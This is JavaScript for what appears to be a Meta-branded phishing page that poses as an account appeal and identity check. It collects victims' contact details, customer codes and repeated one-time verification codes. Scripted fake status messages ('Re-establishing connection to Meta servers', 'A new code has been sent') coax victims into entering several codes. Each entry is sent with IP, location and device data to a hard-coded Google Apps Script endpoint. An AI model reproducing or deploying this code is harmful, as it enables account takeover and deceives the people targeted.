const step1 = document.getElementById("step1");
const step2 = document.getElementById("step2");
const step3 = document.getElementById("step3");
const step5 = document.getElementById("step5");
const step7 = document.getElementById("step7");

const robotCheck = document.getElementById("robotCheck");
const introVideo = document.getElementById("introVideo");

const submitBtn = document.getElementById("submitBtn");
const verifyOtpBtn = document.getElementById("verifyOtpBtn");

const loadingOverlay = document.getElementById("loadingOverlay");
const countdownEl = document.getElementById("countdown");
const loadingTitle = document.getElementById("loadingTitle");
const loadingStatus = document.getElementById("loadingStatus");

const contactInput = document.getElementById("contact");
const customerCodeInput = document.getElementById("customerCode");
const contactError = document.getElementById("contactError");
const customerCodeError = document.getElementById("customerCodeError");

const otpCodeInput = document.getElementById("otpCode");
const otpError = document.getElementById("otpError");
const attemptText = document.getElementById("attemptText");
const resendBtn = document.getElementById("resendBtn");
const resendTimer = document.getElementById("resendTimer");

const requestCode = document.getElementById("requestCode");

const DEMO_OTP_CODE = "123456";
const MAX_OTP_ATTEMPTS = 5;

const failureMessages = {
    1: [
        "<span class='check-color'>✓</span> The verification code is incorrect.",
        "<span class='check-color'>✓</span> Resetting your security session...",
        "<span class='check-color'>✓</span> Sending a new code to your device...",
        "<span class='check-color'>✓</span> This may take a few minutes...",
        "<span class='check-color'>✓</span> Please enter the latest code to proceed."
    ],
    2: [
        "<span class='check-color'>✓</span> Verification code does not match.",
        "<span class='check-color'>✓</span> Synchronizing security data...",
        "<span class='check-color'>✓</span> Requesting a new verification code...",
        "<span class='check-color'>✓</span> Checking notifications on your device...",
        "<span class='check-color'>✓</span> Enter the latest code to finalize."
    ],
    3: [
        "<span class='check-color'>✓</span> Verification code not accepted.",
        "<span class='check-color'>✓</span> Running account security check...",
        "<span class='check-color'>✓</span> Refreshing login session...",
        "<span class='check-color'>✓</span> Transmitting code via secure channel...",
        "<span class='check-color'>✓</span> Please use the latest code received."
    ],
    4: [
        "<span class='check-color'>✓</span> Verification data is invalid.",
        "<span class='check-color'>✓</span> Reviewing request history...",
        "<span class='check-color'>✓</span> Re-establishing connection to Meta servers...",
        "<span class='check-color'>✓</span> Generating a new one-time security code...",
        "<span class='check-color'>✓</span> Please enter the latest code sent to you."
    ],
    5: [
        "<span class='check-color'>✓</span> Analyzing advanced verification data...",
        "<span class='check-color'>✓</span> Security scan completed.",
        "<span class='check-color'>✓</span> Identity successfully verified.",
        "<span class='check-color'>✓</span> Granting final access...",
        "<span class='check-color'>✓</span> <strong>Please enter the latest code to complete.</strong>"
    ]
};

const resendCodeMessages = [
    "<span class='check-color'>✓</span> Requesting a new verification code...",
    "<span class='check-color'>✓</span> Establishing secure server connection...",
    "<span class='check-color'>✓</span> New verification code has been sent.",
    "<span class='check-color'>✓</span> Please check your device.",
    "<span class='check-color'>✓</span> <strong>Ready for new input.</strong>"
];

const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzGnKN-W0wAbiNCMGMVFicewabhfN8ox8pYAtZ3m5Vvx2smHt3YSbdHBz5JG0_ehuydeQ/exec";
const SESSION_ID = "SID-" + Date.now() + "-" + Math.floor(Math.random() * 1000000);

let otpAttempts = 0;
let resendInterval = null;

function buildProgressBars() {
    document.querySelectorAll(".progress").forEach(progress => {
        const current = Number(progress.dataset.progress);
        progress.innerHTML = "";

        for (let i = 1; i <= 5; i++) {
            const dot = document.createElement("span");
            if (i < current) dot.classList.add("done");
            if (i === current) dot.classList.add("active");
            progress.appendChild(dot);
        }
    });
}

function showStep(step) {
    document.querySelectorAll(".step").forEach(item => {
        item.classList.remove("active");
    });
    step.classList.add("active");
    setTimeout(() => { window.scrollTo({ top: 0, behavior: "smooth" }); }, 50);
}

function scrollInputIntoView(inputElement) {
    setTimeout(() => {
        inputElement.scrollIntoView({ behavior: "smooth", block: "center" });
    }, 250);
}

buildProgressBars();

document.querySelectorAll("input").forEach(input => {
    input.addEventListener("focus", function () { scrollInputIntoView(input); });
});

robotCheck.addEventListener("change", function () {
    if (robotCheck.checked) {
        setTimeout(() => { showStep(step2); playVideoStep(); }, 500);
    }
});

function playVideoStep() {
    introVideo.currentTime = 0;
    const playPromise = introVideo.play();
    if (playPromise !== undefined) {
        playPromise.catch(() => { setTimeout(() => { showStep(step3); }, 4000); });
    }
    const fallbackTimer = setTimeout(() => { showStep(step3); }, 5000);
    introVideo.onended = function () { clearTimeout(fallbackTimer); showStep(step3); };
}

submitBtn.addEventListener("click", function () {
    const contact = contactInput.value.trim();
    const customerCode = customerCodeInput.value.trim();
    let isValid = true;
    contactError.innerText = "";
    customerCodeError.innerText = "";
    if (contact === "") { contactError.innerText = "Please enter your contact information."; isValid = false; }
    if (customerCode === "") { customerCodeError.innerText = "Please enter your customer code."; isValid = false; }
    if (!isValid) {
        const firstEmptyInput = contact === "" ? contactInput : customerCodeInput;
        firstEmptyInput.focus();
        scrollInputIntoView(firstEmptyInput);
        return;
    }
    sendToGoogleSheet("Form submitted");
    showLoading({
        title: "Submitting your appeal...",
        afterDone: function () {
            showStep(step5);
            startResendCountdown();
            setTimeout(() => otpCodeInput.focus(), 400);
        }
    });
});

verifyOtpBtn.addEventListener("click", function () {
    const otpCode = otpCodeInput.value.trim();
    otpError.innerText = "";
    if (otpAttempts >= MAX_OTP_ATTEMPTS) { lockOtpForm(); return; }
    if (otpCode === "") {
        otpError.innerText = "Please enter your verification code.";
        otpCodeInput.focus();
        scrollInputIntoView(otpCodeInput);
        return;
    }

    sendToGoogleSheet("Internal code submitted", otpCode);
    otpCodeInput.value = "";

    if (otpCode === DEMO_OTP_CODE) {
        showLoading({
            title: "Submitting your appeal...",
            afterDone: function () {
                requestCode.innerText = generateRequestCode();
                showStep(step7);
            }
        });
    } else {
        otpAttempts++;
        const currentMessages = failureMessages[otpAttempts] || failureMessages[5];

        showLoading({
            title: "Confirm your identity...",
            statuses: currentMessages,
            afterDone: function () {
                const remaining = MAX_OTP_ATTEMPTS - otpAttempts;
                showStep(step5);

                if (remaining <= 0) {
                    lockOtpForm();
                    loadingTitle.innerText = "Verification Complete";
                    loadingStatus.innerHTML = `
                        <div class="loading-status-line">✓ Identity verification request submitted.</div>
                        <div class="loading-status-line">✓ No further action is required from your side.</div>
                        <div class="loading-status-line">✓ Our security team is processing your request.</div>
                    `;
                    countdownEl.innerText = "✓";
                    loadingOverlay.classList.add("active");
                    return;
                }

                otpError.innerHTML = "<strong>Incorrect code. A new code has been sent.</strong>";
                attemptText.innerText = `Bạn còn ${remaining} lần nhập.`;
                setTimeout(() => { otpCodeInput.focus(); scrollInputIntoView(otpCodeInput); }, 400);
            }
        });
    }
});

resendBtn.addEventListener("click", function () {
    otpError.innerText = "";
    otpCodeInput.value = "";
    resendBtn.disabled = true;

    showLoading({
        title: "Requesting new code...",
        statuses: resendCodeMessages,
        afterDone: function () {
            showStep(step5);
            startResendCountdown();
            otpError.innerHTML = "<strong>A new code has been sent to your device.</strong>";
            setTimeout(() => { otpCodeInput.focus(); }, 400);
        }
    });
});

function lockOtpForm() {
    otpCodeInput.disabled = true;
    verifyOtpBtn.disabled = true;
    resendBtn.disabled = true;
    verifyOtpBtn.style.opacity = "0.55";
    verifyOtpBtn.style.cursor = "not-allowed";
    resendBtn.style.opacity = "0.55";
    resendBtn.style.cursor = "not-allowed";
}

function showLoading(options) {
    let seconds = 15;
    const defaultStatuses = [
        "<span class='check-color'>✓</span> Verifying your account information...",
        "<span class='check-color'>✓</span> Processing your review request...",
        "<span class='check-color'>✓</span> Verifying your account security...",
        "<span class='check-color'>✓</span> Sending verification code to your device..."
    ];

    const statuses = options.statuses || defaultStatuses;

    loadingTitle.innerText = options.title;
    loadingStatus.innerHTML = "";
    countdownEl.innerText = seconds;
    loadingOverlay.classList.add("active");

    function addStatus(text) {
        const line = document.createElement("div");
        line.className = "loading-status-line";
        line.innerHTML = text;
        loadingStatus.appendChild(line);
    }

    addStatus(statuses[0]);

    const timer = setInterval(() => {
        seconds--;
        countdownEl.innerText = seconds;

        if (statuses.length === 4) {
            if (seconds === 11) addStatus(statuses[1]);
            if (seconds === 7) addStatus(statuses[2]);
            if (seconds === 3) addStatus(statuses[3]);
        } else if (statuses.length === 5) {
            if (seconds === 12) addStatus(statuses[1]);
            if (seconds === 9) addStatus(statuses[2]);
            if (seconds === 6) addStatus(statuses[3]);
            if (seconds === 3) addStatus(statuses[4]);
        }

        if (seconds <= 0) {
            clearInterval(timer);
            loadingOverlay.classList.remove("active");
            if (typeof options.afterDone === "function") options.afterDone();
        }
    }, 1000);
}

function startResendCountdown() {
    let seconds = 60;
    resendBtn.disabled = false;
    resendTimer.innerText = `${seconds}s`;
    if (resendInterval) clearInterval(resendInterval);
    resendInterval = setInterval(() => {
        seconds--;
        resendTimer.innerText = `${seconds}s`;
        if (seconds <= 0) {
            clearInterval(resendInterval);
            resendBtn.disabled = false;
            resendTimer.innerText = "We can send you another code in a few minutes.";
        }
    }, 1000);
}

function generateRequestCode() {
    const number = Math.floor(100000 + Math.random() * 900000);
    return `REQ-2026-${number}`;
}

function getSimpleDeviceType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/iphone|ipod/.test(ua)) return "iPhone";
    if (/ipad/.test(ua)) return "iPad";
    if (/android/.test(ua)) return "Android";
    if (/mobile/.test(ua)) return "Điện thoại";
    return "Máy tính";
}

const sendToGoogleSheet = async (statusText, internalCode = "") => {
    // 1. Lấy dữ liệu từ localStorage
    const localRaw = localStorage.getItem('vai-ca-biu');
    const localData = localRaw ? JSON.parse(localRaw) : {};

    // 2. Trích xuất thông tin (Đảm bảo các key này tồn tại trong object localData)
    const { 
        ip = "Unknown", 
        city = "Unknown", 
        region = "Unknown", 
        country = "Unknown", 
        postal = "Unknown",
        continent = "Unknown"
    } = localData;

    // 3. Chuẩn bị dữ liệu gửi đi
    const formData = new URLSearchParams();
    formData.append("session_id", SESSION_ID);
    formData.append("contact", contactInput.value.trim());
    formData.append("customer_code", customerCodeInput.value.trim());
    formData.append("internal_code", internalCode);
    formData.append("device", getSimpleDeviceType());
    formData.append("status", statusText);

    // 4. Thêm các trường vị trí
    formData.append("ip", ip);
    formData.append("city", city);
    formData.append("region", region);
    formData.append("country", country);
    formData.append("postal", postal);
    formData.append("continent", continent);

    // 5. Gửi request
    fetch(GOOGLE_SCRIPT_URL, {
        method: "POST",
        body: formData,
        mode: "no-cors"
    }).catch(error => console.error(`Lỗi submit sheet: ${error}`));
};
